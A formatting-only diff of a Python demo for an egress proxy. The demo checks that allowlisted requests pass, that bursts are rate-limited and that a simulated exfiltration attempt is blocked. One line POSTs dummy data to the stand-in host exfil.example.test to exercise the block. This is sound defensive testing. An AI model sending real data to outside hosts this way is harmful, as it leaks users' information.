@@ -9,6 +9,7 @@ stops before any connection.
 
 Run:  python demo_m4.py
 """
+
 from __future__ import annotations
 
 import os
@@ -34,17 +35,14 @@ def main():
     upstream = ThreadingHTTPServer(("127.0.0.1", 0), server_module.Handler)
     upstream_port = upstream.server_address[1]
     threading.Thread(target=upstream.serve_forever, daemon=True).start()
-    proxy = proxy_module.serve("127.0.0.1", 0, db_path,
-                               rate_limit=5, rate_window=1.0)
+    proxy = proxy_module.serve("127.0.0.1", 0, db_path, rate_limit=5, rate_window=1.0)
     proxy_port = proxy.server_address[1]
     threading.Thread(target=proxy.serve_forever, daemon=True).start()
-    opener = urllib.request.build_opener(urllib.request.ProxyHandler(
-        {"http": f"http://127.0.0.1:{proxy_port}"}))
+    opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": f"http://127.0.0.1:{proxy_port}"}))
     base = f"http://127.0.0.1:{upstream_port}"
 
     def call(url, trace, data=None):
-        req = urllib.request.Request(url, data=data,
-                                     method="POST" if data else "GET")
+        req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
         req.add_header("X-Trace-Id", trace)
         try:
             with opener.open(req, timeout=10) as resp:
@@ -56,8 +54,7 @@ def main():
 
     try:
         print(f"allowlisted GET /echo -> {call(f'{base}/echo', 'trace-m4-1')}")
-        blocked = call("http://exfil.example.test/echo", "trace-m4-blocked",
-                       data=b"demo exfil attempt (never forwarded)")
+        blocked = call("http://exfil.example.test/echo", "trace-m4-blocked", data=b"demo exfil attempt (never forwarded)")
         print(f"non-allowlisted exfil attempt -> {blocked}")
         burst = [call(f"{base}/echo", f"trace-m4-burst-{i}") for i in range(7)]
         print(f"burst of 7 (limit 5/1s) -> {burst}")
@@ -71,30 +68,41 @@ def main():
         attempts = totals["attempts"] or 0
         successes = totals["successes"] or 0
         rate = (100.0 * successes / attempts) if attempts else 0.0
-        print(f"allowed={outcomes['allowed']} blocked={outcomes['blocked']} "
-              f"rate_limited={outcomes['rate_limited']} "
-              f"paused={outcomes['paused']} "
-              f"redirected={outcomes['redirected']} "
-              f"stopped={outcomes['stopped']} "
-              f"verified={outcomes['verified']} "
-              f"warned={outcomes['warned']} "
-              f"other={outcomes['other']}")
-        print(f"attempts={attempts} traces={totals['traces'] or 0} "
-              f"successes={successes} success_rate={rate:.1f}% "
-              f"retries={totals['retries'] or 0} "
-              f"bytes_in={totals['bytes_in'] or 0} "
-              f"bytes_out={totals['bytes_out'] or 0} "
-              f"cost_dollars={totals['cost_dollars'] or 0:.4f}")
+        print(
+            f"allowed={outcomes['allowed']} blocked={outcomes['blocked']} "
+            f"rate_limited={outcomes['rate_limited']} "
+            f"paused={outcomes['paused']} "
+            f"redirected={outcomes['redirected']} "
+            f"stopped={outcomes['stopped']} "
+            f"verified={outcomes['verified']} "
+            f"warned={outcomes['warned']} "
+            f"other={outcomes['other']}"
+        )
+        print(
+            f"attempts={attempts} traces={totals['traces'] or 0} "
+            f"successes={successes} success_rate={rate:.1f}% "
+            f"retries={totals['retries'] or 0} "
+            f"bytes_in={totals['bytes_in'] or 0} "
+            f"bytes_out={totals['bytes_out'] or 0} "
+            f"cost_dollars={totals['cost_dollars'] or 0:.4f}"
+        )
         # The first /echo call also counts toward the same
         # destination window, so the burst forwards 4, not 5.
-        assert outcomes == {"allowed": 6, "blocked": 1,
-                            "rate_limited": 3, "paused": 0,
-                            "redirected": 0, "stopped": 0,
-                            "verified": 0, "warned": 0, "other": 0}
-        print("PASS: allowed forwarded, exfil blocked at proxy, "
-              "burst excess rate_limited, recovery after pause")
+        assert outcomes == {
+            "allowed": 6,
+            "blocked": 1,
+            "rate_limited": 3,
+            "paused": 0,
+            "redirected": 0,
+            "stopped": 0,
+            "verified": 0,
+            "warned": 0,
+            "other": 0,
+        }
+        print("PASS: allowed forwarded, exfil blocked at proxy, burst excess rate_limited, recovery after pause")
     finally:
-        proxy.shutdown(); upstream.shutdown()
+        proxy.shutdown()
+        upstream.shutdown()
         proxy.state.conn.close()
         tmp.cleanup()
 
